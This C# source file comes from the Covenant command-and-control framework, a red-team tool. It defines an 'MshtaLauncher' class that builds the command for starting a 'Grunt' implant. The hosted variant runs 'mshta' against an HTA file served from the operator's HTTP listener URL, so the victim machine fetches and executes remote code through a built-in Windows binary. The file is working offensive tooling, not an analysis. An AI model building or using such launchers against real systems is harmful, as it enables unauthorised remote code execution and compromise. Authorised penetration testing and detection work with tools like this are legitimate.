﻿// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using Microsoft.CodeAnalysis;

using Covenant.Models.Listeners;

namespace Covenant.Models.Launchers
{
    public class MshtaLauncher : ScriptletLauncher
    {
        public MshtaLauncher()
        {
            this.Name = "Mshta";
            this.Type = LauncherType.Mshta;
            this.Description = "Uses mshta.exe to launch a Grunt using a COM activated Delegate and ActiveXObjects.";
            this.ScriptType = ScriptletType.TaggedScript;
            this.OutputKind = OutputKind.DynamicallyLinkedLibrary;
        }

        protected override string GetLauncher(String code)
        {
            string launcher = "mshta" + " " + "file.hta";
            this.LauncherString = launcher;
            return this.LauncherString;
        }

        public override string GetHostedLauncher(Listener listener, HostedFile hostedFile)
        {
            HttpListener httpListener = (HttpListener)listener;
            if (httpListener != null)
            {
				Uri hostedLocation = new Uri(httpListener.Url + hostedFile.Path);
                string launcher = "mshta" + " " + hostedLocation;
                this.LauncherString = launcher;
                return launcher;
            }
            else { return ""; }
        }
    }
}
